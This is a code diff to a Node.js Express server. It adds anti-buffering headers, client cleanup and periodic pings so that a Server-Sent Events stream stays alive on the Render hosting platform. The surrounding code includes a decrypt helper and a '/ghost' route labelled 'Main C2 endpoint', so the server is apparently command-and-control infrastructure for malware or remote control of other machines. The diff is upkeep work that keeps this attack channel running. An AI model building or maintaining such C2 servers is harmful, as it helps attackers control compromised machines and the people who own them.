@@ -24,13 +24,17 @@ app.get('/events', (req, res) => {
   res.setHeader('Content-Type', 'text/event-stream');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('Connection', 'keep-alive');
+  // ←←← ADD THESE TWO LINES
+  res.setHeader('X-Accel-Buffering', 'no');        // <--- THIS ONE IS CRITICAL FOR RENDER
+  res.setHeader('Access-Control-Expose-Headers', '*');
+
   res.flushHeaders();
 
-  res.write(': connected\n\n');
+  res.write(': keep-alive\n\n');  // initial comment
   clients.push(res);
 
   req.on('close', () => {
-    clients.splice(clients.indexOf(res), 1);
+    clients = clients.filter(c => c !== res);
   });
 });
 
@@ -78,6 +82,13 @@ function decrypt(b64) {
     return null;
   }
 }
+
+// Keep Render from killing SSE
+setInterval(() => {
+  clients.forEach(client => {
+    try { client.write(': ping\n\n'); } catch {}
+  });
+}, 15000);
 
 // Main C2 endpoint
 app.post('/ghost', (req, res) => {
